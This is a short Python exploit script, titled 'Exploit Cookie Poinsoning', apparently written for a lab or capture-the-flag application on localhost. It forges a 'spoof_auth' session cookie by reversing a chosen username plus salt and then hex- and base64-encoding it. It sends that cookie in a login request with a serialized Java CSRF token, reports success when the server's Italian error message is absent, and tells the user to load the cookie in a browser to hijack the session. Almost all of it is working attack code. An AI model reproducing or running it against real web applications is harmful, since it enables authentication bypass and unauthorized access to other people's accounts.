import base64
import string
import codecs
import random
import requests

def generate_salt(length=10):
    return ''.join(random.choice(string.ascii_letters) for _ in range(length))

def reverse_encode(input_string):
    reversed_string = input_string[::-1]
    hex_string = codecs.encode(reversed_string.encode('utf-8'), 'hex').decode('utf-8')
    encoded_string = base64.b64encode(hex_string.encode('utf-8')).decode('utf-8')

    return encoded_string

if __name__ == "__main__":
    print("Exploit Cookie Poinsoning")
    input_string = input("insert username to use: ");

    enc_b64 = reverse_encode(input_string + generate_salt())
    print("B64:", enc_b64)

    print("Try to expoit vulnerability...\n")

    url = "http://localhost:3001/api/sessions"
    headers = {'Content-Type': 'application/json'}
    atk = {"username": "random@random.it", "password": "nulllllll", "csrf": "rO0ABXNyAB1jb20ucG9saXRvLnFhLm1vZGVsLkNTUkZUb2tlbiCggYhMsIsxAgABTAAFdmFsdWV0ABBMamF2YS91dGlsL1VVSUQ7eHBzcgAOamF2YS51dGlsLlVVSUS8mQP3mG2FLwIAAkoADGxlYXN0U2lnQml0c0oAC21vc3RTaWdCaXRzeHCq84qDs/gEPGr/u8up8k88"}
    cookies = {'spoof_auth': enc_b64}
    pr = requests.post(url=url, json=atk, headers=headers, cookies=cookies)

    if(pr.text != "Errore di autenticazione"):
        print("OK SUCCESS LOGIN")
        print(pr.text)
        print("If you wanna see the result in the web browser put "+ enc_b64+" in the browser's cookie")

